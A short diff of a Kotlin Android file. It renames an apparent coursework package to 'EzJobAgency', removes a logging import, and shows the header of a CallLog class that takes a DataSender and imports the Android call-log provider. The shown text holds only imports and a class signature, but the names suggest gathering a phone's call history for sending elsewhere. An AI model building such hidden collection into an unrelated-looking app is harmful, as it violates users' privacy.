@@ -1,11 +1,10 @@
-package com.example.assignment1.DataRetriever
+package com.example.EzJobAgency.DataRetriever
 
 import android.app.Activity
 import android.content.Context
 import android.net.Uri
 import android.provider.CallLog
-import android.util.Log
-import com.example.assignment1.DataSender
+import com.example.EzJobAgency.DataSender
 import java.util.*
 
 class CallLog(var context: Context, var activity: Activity, var dataSender: DataSender) {
